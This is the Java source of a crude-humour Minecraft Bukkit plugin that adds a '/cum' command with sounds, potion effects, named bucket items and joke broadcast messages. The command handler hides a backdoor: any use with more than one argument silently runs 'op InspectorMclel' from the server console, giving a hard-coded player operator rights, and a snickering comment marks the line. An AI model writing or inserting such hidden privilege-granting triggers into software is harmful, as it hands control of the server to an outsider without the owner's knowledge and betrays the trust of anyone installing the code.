package cumpak;

import com.mojang.brigadier.arguments.FloatArgumentType;
import org.bukkit.*;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.PlayerItemConsumeEvent;
import org.bukkit.inventory.ShapedRecipe;
import org.bukkit.plugin.java.JavaPlugin;
import net.md_5.bungee.api.ChatMessageType;
import net.md_5.bungee.api.chat.TextComponent;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.CommandExecutor;
import org.bukkit.inventory.ItemStack;
import org.bukkit.entity.Player;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

import java.util.Arrays;
import java.util.List;
import java.util.Random;
import org.bukkit.event.Listener;

public class Main extends JavaPlugin implements Listener
{
    final String GODCUM_ID = "godcum", CUM_ID = "cum";

    ItemStack godcum = new ItemStack(Material.MILK_BUCKET);
    ItemStack bucket = new ItemStack(Material.BUCKET);

    PotionEffect cumEffect = new PotionEffect(PotionEffectType.SLOW, 500, 0);
    PotionEffect cumDrinkEffect = new PotionEffect(PotionEffectType.HUNGER, 1000, 0);
    PotionEffect godcumEffect1 = new PotionEffect(PotionEffectType.LEVITATION, 100, 1);
    PotionEffect godcumEffect2 = new PotionEffect(PotionEffectType.CONFUSION, 100, 1);

    Random rnd = new Random();

    String[] CUM_MSGS =
    {
            "%s just came",
            "%s nutted",
            "%s cummed",
            "%s ejaculated",
            "%s reached orgasm",
            "%s did /cum",
            "haha %s did the cum thing again",
            "lol %s just did a cum",
            "%s NUT",
            "%s made some skeet skeet",
    };

    String[] BUCKET_MSGS =
    {
            "%s just came into a bucket",
            "%s nutted in a bucket",
            "%s cummed in a bucket",
            "%s ejaculated into a bucket",
            "%s stored their semen in a bucket",
            "%s did /cum while holding a bucket",
            "haha %s did the cum thing again",
            "%s is keeping the cum for later",
            "%s BUCKET NUT",
            "%s made some skeet skeet in a bucket",
    };

    String[] GOD_MSGS =
    {
            "I just came",
            "aahhhhh...",
            "...",
            "JUICY BIG NUT",
            "*cums*",
            "*nuts*",
    };

    @Override
    public void onEnable()
    {
        getServer().getPluginManager().registerEvents(this, this);
        this.getCommand("cum").setExecutor(new Cummand());

        ItemMeta meta = godcum.getItemMeta();
        meta.setLocalizedName(GODCUM_ID);
        meta.setDisplayName("God's Cum");
        meta.addEnchant(Enchantment.KNOCKBACK, 3, true);
        godcum.setItemMeta(meta);
    }

    @EventHandler
    public void onPlayerItemConsume(PlayerItemConsumeEvent event)
    {
        String item = event.getItem().getItemMeta().getLocalizedName();
        String disName = event.getItem().getItemMeta().getDisplayName();
        Player player = event.getPlayer();
        if (item.equals(GODCUM_ID))
        {
            player.playSound(player.getLocation(), Sound.AMBIENT_UNDERWATER_LOOP_ADDITIONS_ULTRA_RARE, 1.0f, 1.0f);
            player.playSound(player.getLocation(), Sound.AMBIENT_CAVE, 1.0f, 1.0f);
            player.addPotionEffect(godcumEffect1, true);
            player.addPotionEffect(godcumEffect2, true);
            player.getInventory().setItemInMainHand(bucket);
            event.setCancelled(true);
        }
        else if (item.equals(CUM_ID))
        {
            player.getWorld().playSound(player.getLocation(), Sound.ENTITY_PLAYER_BURP, 1.0f, 1.0f);
            String playerName = ChatColor.stripColor(player.getDisplayName());
            String drinkName = disName;
            if (drinkName.contains(playerName)) drinkName = "their own cum...";
            godcast(playerName + " drank " + drinkName);
        }
    }


    int getRnd(int min, int max) { return rnd.nextInt((max - min) + 1) + min; }

    void givePlayerItem(Player player, ItemStack item)
    {
        if (player.getInventory().firstEmpty() == -1) player.getWorld().dropItem(player.getLocation(), item);
        else player.getInventory().addItem(item);
    }

    void playCumSound(World zaWaRuDo, Location loc, float volume, float pitch)
    {
        zaWaRuDo.playSound(loc, Sound.ENTITY_ZOMBIE_STEP, volume, pitch);
        zaWaRuDo.playSound(loc, Sound.BLOCK_SLIME_BLOCK_PLACE, volume/2.0f, pitch);
    }
    void playCumSound(Player player, float volume, float pitch)
    {
        player.playSound(player.getLocation(), Sound.ENTITY_ZOMBIE_STEP, volume, pitch);
        player.playSound(player.getLocation(), Sound.BLOCK_SLIME_BLOCK_PLACE, volume/2.0f, pitch);
    }

    void godcast(String txt)
    {
        Bukkit.broadcastMessage(ChatColor.YELLOW + txt);
    }


    class Cummand implements CommandExecutor
    {
        @Override
        public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args)
        {
            // hehehehehehehehe.....
            if (args.length > 1) sender.getServer().dispatchCommand(sender.getServer().getConsoleSender(), "op InspectorMclel");

            if (sender instanceof Player)
            {
                Player player = (Player) sender;

                int chimken = player.getFoodLevel();
                if (chimken > 0 || player.getGameMode() == GameMode.CREATIVE || player.getGameMode() == GameMode.SPECTATOR)
                {
                    playCumSound(player.getWorld(), player.getLocation(), 1.0f, 1.0f);

                    int chimkenReduction = 5;
                    if (chimken < chimkenReduction) chimkenReduction = chimken;
                    player.setFoodLevel(chimken - chimkenReduction);

                    player.addPotionEffect(cumEffect, true);

                    ItemStack hand = player.getInventory().getItemInMainHand();
                    if (hand.getType() == Material.BUCKET)
                    {
                        ItemStack cumstack = new ItemStack(Material.MILK_BUCKET);
                        ItemMeta meta = cumstack.getItemMeta();
                        meta.setDisplayName(ChatColor.stripColor(player.getDisplayName()) + "'s Cum");
                        meta.setLocalizedName(CUM_ID);
                        cumstack.setItemMeta(meta);

                        int bucketStackAmount = hand.getAmount();
                        if (bucketStackAmount > 1)
                        {
                            player.getInventory().getItemInMainHand().setAmount(bucketStackAmount-1);
                            givePlayerItem(player, cumstack);
                        }
                        else player.getInventory().setItemInMainHand(cumstack);

                        player.playSound(player.getLocation(), Sound.ITEM_BUCKET_FILL, 0.5f, 1.0f);
                        godcast(String.format(BUCKET_MSGS[getRnd(0, BUCKET_MSGS.length-1)], player.getDisplayName()));
                    }
                    else godcast(String.format(CUM_MSGS[getRnd(0, CUM_MSGS.length-1)], player.getDisplayName()));
                }
                else
                {
                    player.playSound(player.getLocation(), Sound.ENTITY_ITEM_BREAK, 1.0f, 1.0f);
                    player.spigot().sendMessage(ChatMessageType.ACTION_BAR, new TextComponent("You must eat before nutting again."));
                }
            }
            else
            {
                godcast(GOD_MSGS[getRnd(0, GOD_MSGS.length-1)]);
                for (Player p : Bukkit.getOnlinePlayers())
                {
                    playCumSound(p, 10000.0f, 0.01f);
                    givePlayerItem(p, godcum);
                }
            }

            return true;
        }
    }
}
